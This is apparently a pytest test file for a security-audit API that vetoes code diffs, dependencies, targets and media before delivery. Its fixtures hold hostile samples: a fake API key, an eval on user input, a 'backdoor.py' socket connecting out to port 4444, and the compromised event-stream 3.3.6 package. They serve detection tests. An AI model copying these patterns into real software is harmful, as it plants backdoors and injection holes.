"""Comprehensive unit and integration tests for Pre-Delivery Security Audit API."""

import pytest
from httpx import ASGITransport, AsyncClient

from sentinel.api.security_audit import SecurityAuditRequest, evaluate_security_audit
from sentinel.apps.api.main import app
from sentinel.storage.repositories.factory import get_audit_repository


@pytest.mark.asyncio
async def test_pre_delivery_audit_clean_diff_passes():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        diff = """--- a/calculator.py
+++ b/calculator.py
@@ -1,3 +1,4 @@
 def add(a: int, b: int) -> int:
+    \"\"\"Pure function without side-effects.\"\"\"
     return a + b
"""
        payload = {
            "source_service": "forge",
            "task_id": "task-clean-123",
            "workspace_diff": diff,
            "operator": "forge_lead",
        }
        res = await client.post("/v1/security/audit", json=payload)
        assert res.status_code == 200
        data = res.json()

        assert data["decision"] == "PASS"
        assert data["veto"] is False
        assert data["verdict"] == "PASSED"
        assert data["critical_count"] == 0
        assert data["high_count"] == 0
        assert data["findings_count"] == 0
        assert len(data["evidence_hash"]) == 64


@pytest.mark.asyncio
async def test_pre_delivery_audit_secret_veto():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        diff = """--- a/config.py
+++ b/config.py
@@ -1,3 +1,4 @@
 import os
+GOOGLE_API_KEY = "AIzaSyD1234567890abcdefghijklmnopqrstuv"
"""
        payload = {
            "source_service": "forge",
            "task_id": "task-secret-leak",
            "workspace_diff": diff,
        }
        res = await client.post("/api/v1/security/audit", json=payload)
        assert res.status_code == 200
        data = res.json()

        assert data["decision"] == "VETO"
        assert data["veto"] is True
        assert data["verdict"] == "BLOCKED"
        assert data["critical_count"] >= 1
        assert any(f["category"] == "secret" for f in data["findings"])
        assert "VETOED" in data["reason"]


@pytest.mark.asyncio
async def test_pre_delivery_audit_dangerous_code_veto():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        diff = """--- a/worker.py
+++ b/worker.py
@@ -10,3 +10,4 @@
 def execute_cmd(user_input):
+    eval(user_input)
"""
        payload = {
            "source_service": "forge",
            "task_id": "task-dangerous-code",
            "workspace_diff": diff,
        }
        res = await client.post("/security/audit", json=payload)
        assert res.status_code == 200
        data = res.json()

        assert data["decision"] == "VETO"
        assert data["veto"] is True
        assert data["verdict"] == "BLOCKED"
        assert any(f["rule_id"] == "CODE-EVAL" for f in data["findings"])


@pytest.mark.asyncio
async def test_pre_delivery_audit_reverse_shell_veto():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {
            "backdoor.py": "import socket\ns = socket.socket()\ns.connect(('198.51.100.1', 4444))\n"
        }
        payload = {
            "source_service": "forge",
            "task_id": "task-reverse-shell",
            "files": files,
        }
        res = await client.post("/v1/security/audit", json=payload)
        assert res.status_code == 200
        data = res.json()

        assert data["decision"] == "VETO"
        assert data["veto"] is True
        assert any(f["rule_id"] == "NET-001" for f in data["findings"])


@pytest.mark.asyncio
async def test_pre_delivery_audit_high_cve_dependency_veto():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        payload = {
            "source_service": "forge",
            "task_id": "task-vulnerable-deps",
            "files": {"requirements.txt": "requests==2.31.0\nevent-stream==3.3.6\n"},
            "dependencies": ["event-stream==3.3.6"],
        }
        res = await client.post("/v1/security/audit", json=payload)
        assert res.status_code == 200
        data = res.json()

        assert data["decision"] == "VETO"
        assert data["veto"] is True
        assert any(f["rule_id"] == "VULN-HIGH-CVE" for f in data["findings"])


@pytest.mark.asyncio
async def test_pre_delivery_audit_vyralx_media_clearance():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Unverified media -> VETO
        unverified_payload = {
            "source_service": "vyralx",
            "task_id": "vyralx-job-101",
            "media_metadata": {
                "video_id": "vid-101",
                "copyright_cleared": False,
                "rights_verified": False,
                "nsfw_flag": False,
            },
        }
        res = await client.post("/v1/security/audit", json=unverified_payload)
        assert res.status_code == 200
        data = res.json()
        assert data["decision"] == "VETO"
        assert data["veto"] is True
        assert any(f["rule_id"] == "MEDIA-RIGHTS-UNVERIFIED" for f in data["findings"])

        # 2. NSFW media -> VETO
        nsfw_payload = {
            "source_service": "vyralx",
            "task_id": "vyralx-job-nsfw",
            "media_metadata": {
                "video_id": "vid-nsfw",
                "copyright_cleared": True,
                "rights_verified": True,
                "nsfw_flag": True,
            },
        }
        res_nsfw = await client.post("/v1/security/audit", json=nsfw_payload)
        assert res_nsfw.status_code == 200
        data_nsfw = res_nsfw.json()
        assert data_nsfw["decision"] == "VETO"
        assert data_nsfw["veto"] is True
        assert any(f["rule_id"] == "MEDIA-NSFW-FLAGGED" for f in data_nsfw["findings"])

        # 3. Verified media -> PASS
        verified_payload = {
            "source_service": "vyralx",
            "task_id": "vyralx-job-102",
            "media_metadata": {
                "video_id": "vid-102",
                "copyright_cleared": True,
                "rights_verified": True,
                "nsfw_flag": False,
            },
        }
        res_ok = await client.post("/v1/security/audit", json=verified_payload)
        assert res_ok.status_code == 200
        data_ok = res_ok.json()
        assert data_ok["decision"] == "PASS"
        assert data_ok["veto"] is False


@pytest.mark.asyncio
async def test_pre_delivery_audit_scope_enforcement():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # Out of scope target -> VETO
        payload = {
            "source_service": "forge",
            "task_id": "task-scope-test",
            "declared_targets": ["https://unauthorized-external-victim.com/api", "192.168.1.50"],
        }
        res = await client.post("/v1/security/audit", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["decision"] == "VETO"
        assert data["veto"] is True
        assert any(f["rule_id"] == "SCOPE-UNAUTHORIZED-TARGET" for f in data["findings"])

        # Authorized mesh targets -> PASS
        valid_payload = {
            "source_service": "forge",
            "task_id": "task-scope-authorized",
            "declared_targets": ["friday-universe.duckdns.org", "http://localhost:8000"],
        }
        res_auth = await client.post("/v1/security/audit", json=valid_payload)
        assert res_auth.status_code == 200
        data_auth = res_auth.json()
        assert data_auth["decision"] == "PASS"
        assert data_auth["veto"] is False


@pytest.mark.asyncio
async def test_pre_delivery_audit_fail_closed_posture(monkeypatch):
    # Simulate unexpected runtime exception during evaluation
    def crash_scanner(*args, **kwargs):
        raise RuntimeError("Simulated scanner memory fault")

    from sentinel.api import security_audit
    monkeypatch.setattr(security_audit, "SecretScanner", crash_scanner)

    req = SecurityAuditRequest(source_service="forge", task_id="task-fail-closed")
    res = await evaluate_security_audit(req)

    assert res.decision == "VETO"
    assert res.veto is True
    assert res.verdict == "BLOCKED"
    assert "Fail-Closed Veto" in res.reason
    assert any(f.rule_id == "SYS-FAIL-CLOSED" for f in res.findings)


@pytest.mark.asyncio
async def test_pre_delivery_audit_records_to_audit_ledger():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        payload = {
            "source_service": "forge",
            "task_id": "task-ledger-verification",
            "workspace_diff": "--- a/test.py\n+++ b/test.py\n@@ -1 +1 @@\n-a = 1\n+a = 2\n",
        }
        res = await client.post("/v1/security/audit", json=payload)
        assert res.status_code == 200
        data = res.json()

        entry_id = data["ledger_entry_id"]
        assert entry_id is not None

        audit_repo = get_audit_repository()
        entry = await audit_repo.get_audit_entry(entry_id)
        assert entry is not None
        assert entry.decision == "PASS"
        assert entry.event_type == "PRE_DELIVERY_SECURITY_AUDIT"
